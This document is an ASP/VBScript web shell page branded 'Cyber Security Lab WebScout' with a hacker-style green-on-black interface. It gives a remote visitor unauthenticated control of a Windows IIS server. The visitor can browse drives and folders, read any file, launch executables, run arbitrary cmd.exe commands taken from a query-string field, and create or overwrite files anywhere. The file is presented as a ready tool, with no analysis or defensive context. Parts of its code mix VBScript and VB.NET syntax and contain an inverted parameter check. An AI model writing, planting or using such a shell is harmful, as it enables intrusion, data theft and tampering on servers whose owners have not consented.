<%@ Language=VBScript Debug="true" %>
<html>
<head>
    <style>
        a:link {color: Lime}
        a:visited {color: Lime}
    </style>
</head>
<body style="background-color:Black; color:Lime; font-size:medium; font-family:Courier; font-weight:bold;">

<% 'Dim myprocess As System.Diagnostics.Process = New System.Diagnostics.Process()
   'myprocess.StartInfo.FileName = "cmd.exe"
   'myprocess.StartInfo.WorkingDirectory = "c:\windows\system32\"
   'myprocess.StartInfo.Arguments= "/k mkdir c:\inetpub\wwwroot\foo" 'put your command line parameters in here
   'myprocess.Start()
%>
<%
On Error Goto ErrorHandle
GoTo Begining
ErrorHandle:
	Dim LastError As Exception
	Dim ErrMessage As String

	LastError = Server.GetLastError()

	If Not LastError Is Nothing Then
	   ErrMessage = LastError.Message
	Else
	   ErrMessage = "No Errors"
	End If
 
	Response.Write("Last Error = " & ErrMessage)
	
	GoTo Ending
Begining:

dim currFileName
currFileName = right(Request.ServerVariables("PATH_TRANSLATED"), len(Request.ServerVariables("PATH_TRANSLATED")) - InStrRev(Request.ServerVariables("PATH_TRANSLATED"), "\"))

dim secbanner0 = "<br/><br/>"
dim secbanner1 = "-------/////    Cyber Security Lab WebScout    \\\\\-------"
dim secbanner2 = "----------------------------------------"

Response.Write("<center>" & secbanner0 & secbanner1 & "<br/>" & secbanner2 & "<br/><br/><br/><br/></center>")

%>

<form action="<%=currFileName %>">
    <div style="border:solid 1px Lime; width:850px;">
        <br/>
        <div style="text-decoration:underline ;">Exploring the file system:</div>
        <br/><br/>&nbsp;Directory path to explore: 
        <br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" id="JumpLoc" size="88" />
        <input type="button" value="Explore" onclick="window.location = '<%=currFileName%>?command=' + document.all('JumpLoc').value;" /><br/><br/>

<%
dim Shell
if (Request.QueryString("Command") <> "") then
    dim path
    path = Request.QueryString("Command")
    if (path = "" or len(path) < 2) then
        path = Left(Request.ServerVariables("PATH_TRANSLATED"), InStrRev(Request.ServerVariables("PATH_TRANSLATED"), "\"))
    end if
    if (UCase(right(path, 4)) = ".EXE") then
        Response.Write("Current command: " & path & "<br><br><br>")
    else
        Response.Write("Current command: " & path & "<br><br><br>")
    end if
    dim parent
    parent = Left(left(path, len(path) - 1), InStrRev(left(path, len(path) - 1), "\"))
    
    if (parent = "") then
        parent = "My Computer"
    end if
    
    dim fso
    fso = Server.CreateObject("Scripting.FileSystemObject")
    
    if (path = "My Computer") then      
        dim drive
        
        for each drive in fso.Drives
            response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & drive.driveLetter & ":\"">(" & drive.driveLetter & ":)</a><br>")
        next
    else
        if (fso.FileExists(path)) then        
            response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & parent & """>Parent Directory</a><br><br>")
            if (UCase(right(path, 4)) = ".EXE") then
                response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & path & "%20"">Do not run</a><br>")            
                Shell = server.CreateObject("WScript.Shell")
                if (Request.QueryString("CommandParams") <> "") then
                    Shell.Run(path)
                else
                    Shell.Run(path & " " & Request.QueryString("CommandParams"))
                end if
            else
                dim txtStream
                txtStream = fso.OpenTextFile(path, 1)

                if (not txtStream.AtEndOfStream) then
                    Response.Write(Replace(Server.HTMLEncode(txtStream.ReadAll()), vbNewLine, "<br>"))
                else
                    Response.Write("Unable to display the file")
                end if
            end if
         else 
            if (fso.FolderExists(path)) then
                response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & parent & """><..></a><br>")
                
                dim folder
                folder = fso.GetFolder(path)
                
                dim SubFolder
                for each SubFolder in folder.SubFolders
                    if (right(path, 1) <> "\") then
                        response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & path & "\" & SubFolder.name & """>&lt;" & SubFolder.name & "&gt;</a><br>")
                    else
                        response.Write("&nbsp;<a href=""" & currFileName & "?Command=" & path & SubFolder.name & """>&lt;" & SubFolder.name & "&gt;</a><br>")
                    end if
                next
                
                dim File
                for each File in folder.Files
                    if (right(path, 1) <> "\") then
                        response.Write("&nbsp;&nbsp;<a href=""" & currFileName & "?Command=" & path & "\" & File.name & """>" & File.name & "</a><br>")
                    else
                        response.Write("&nbsp;&nbsp;<a href=""" & currFileName & "?Command=" & path & File.name & """>" & File.name & "</a><br>")
                    end if
                next
            else
                Response.Write("<a href=""javascript:window.history.back(1)"">Go Back</a><br>")
                response.Write("Invalid path or drive not ready")
            end if
        end if
    end if
end if

%>     
    </div>
    <br/>
</form>
<form action="<%=currFileName %>">
    <div style="border:solid 1px lime; width:850px;">
        <br/>
        <div style="text-decoration:underline">Executing shell command</div>
        <br/><br/>&nbsp;Command:
        <br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" size="88" name="CustomCommand" />
        <input type="submit" value="Execute" /><br/><br/>
<%
if (Request.QueryString("CustomCommand") <> "") then
    Response.Write("<a href=""javascript:window.history.back(1)"">Go Back</a><br>")

    Response.Write("attempting to exec: cmd /k " & Request.QueryString("CustomCommand") & " &gt; c:\inetpub\wwwroot\output.txt </br>")
    Dim myprocess As System.Diagnostics.Process = New System.Diagnostics.Process()
    myprocess.StartInfo.FileName = "cmd.exe"
    myprocess.StartInfo.WorkingDirectory = "c:\windows\system32\"
    myprocess.StartInfo.Arguments= "/k "&Request.QueryString("CustomCommand")&" > c:\inetpub\wwwroot\output.txt"  'put your command line parameters in here
    myprocess.Start()
    System.Threading.Thread.Sleep(2000)
    dim fso
    fso = Server.CreateObject("Scripting.FileSystemObject")
    dim txtStream
    txtStream = fso.OpenTextFile("c:\inetpub\wwwroot\output.txt", 1)
    ' 9 big bite for lior !
    if (not txtStream.AtEndOfStream) then
          Response.Write(Replace(Server.HTMLEncode(txtStream.ReadAll()), vbNewLine, "<br>"))
    else
          Response.Write("Unable to display the file")
    end if


'###############
end if
%>
    </div>
</form>

<form action="<%=currFileName %>" method="post">
    <div style="border:solid 1px lime; width:850px;">
        <br/>
        <div style="text-decoration:underline">File Creation</div><br/><br/>
        &nbsp;File name to create (full path):
        <br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="FileName" size="88" /><br/><br/>
        &nbsp;Created file content:
        <br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;<textarea name="FileContent" rows="10" cols="68"></textarea><br/><br/>
        &nbsp;Overwrite existing file: &nbsp;<input type="checkbox" name="OverwriteYN" /><br/><br/><br/>
        &nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="Attempt To Create File" /><br/><br/>

<%
if (Request.Form("FileName") <> "") then
    Response.Write("<a href=""javascript:window.history.back(1)"">Go Back</a><br>")
    
    dim fileSystemObject
    fileSystemObject = Server.CreateObject("Scripting.FileSystemObject")
    
    dim fullFileName
    fullFileName = Request.Form("FileName")
    
    dim overwrite
    if (Request.Form("OverwriteYN") <> "") then
        overwrite = true
    else
        overwrite = false
    end if
    
    dim textStream

    dim fileToWrite
    dim folderName
    fileToWrite = FileSystemObject.GetFileName(fullFileName)
    folderName = Left(fullFileName, len(fullFileName)-len(fileToWrite))
    
    if (folderName <> "") then
        if ((Not fileSystemObject.FolderExists(folderName)) And _
            (Not (fileSystemObject.FileExists(fullFileName) And Not overwrite))) then
            fileSystemObject.CreateFolder(folderName)
            Response.Write("Created folder: " & folderName & "<br/>")
        end if
        
        if (fileSystemObject.FolderExists(folderName)) then
            fileSystemObject.CreateTextFile(fullFileName, overwrite)
            Response.Write("Created file: " & fullFileName & "<br/>")
            
            textStream = fileSystemObject.OpenTextFile(fullFileName, 2, False)
            dim fcontent = Request.Form("FileContent")
            textStream.Write(fcontent)
            textStream.Close()
            Response.Write("File written successfully<br/>")
        else
            Response.Write("Error creating\\writing file<br/>")            
        end if
    end if
end if

Ending:
%>
    </div>
</form>
<form action="<%=currFileName %>">
    <div style="border:solid 1px lime; width:850px;">
        <br/>
        <div style="text-decoration:underline">File execution aditional parameters</div><br/><br/>
        &nbsp;Command Parameters:
        <br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" size="88" name="CommandParams" />
        <span style="font-size:x-small">(Now click the EXE link)</span><br/><br/>
    </div>
    <br/>
</form>
</body>
</html>
